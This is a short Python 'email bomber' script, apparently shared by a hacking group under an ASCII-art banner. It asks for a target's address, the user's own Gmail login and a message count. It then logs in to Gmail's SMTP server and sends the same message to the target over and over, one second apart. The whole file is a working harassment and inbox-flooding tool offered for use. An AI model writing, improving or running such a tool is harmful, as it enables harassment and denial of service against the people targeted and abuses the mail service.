import smtplib
import time
print("_________    __        __        ____        ________    __                                             ")
print("|########|  |##\      /##|      /####\      |########|  |##|              By D3XBugg3R                  ")
print("|##|____    |###\ __ /###|     /##/\##\        |##|     |##|            With <3 of T34M GCA             ")
print("|########|  |##| |##| |##|    /########\       |##|     |##|         ____   __       ____   __  ___     ")
print("|##|_____   |##|      |##|   /##/    \##\    __|##|__   |##|_______   |__| |  | |\/|  |__| |__  |__|    ")
print("|########|  |##|      |##|  /##/      \##\  |########|  |##########| _|__| |__| |  | _|__| |__  |  \    ")

try:
    bomb_email = input("Enter Email address on Whom you want to perfom this attack: ")
    email = input("Enter your gmail_address:")
    password = input("Enter your gmail_password:")
    message = input("Enter Message:")
    counter = int(input("How many message you want to send?:"))

    for x in range(0, counter):
        print("Number of Message Sent : ", x+1)
        mail = smtplib.SMTP('smtp.gmail.com', 587)
        mail.ehlo()
        mail.starttls()
        mail.login(email, password)
        mail.sendmail(email, bomb_email, message)
        time.sleep(1)
    mail.close()
except Exception as e:
    print("Something is wrong, please Re-try Again with Valid input.")
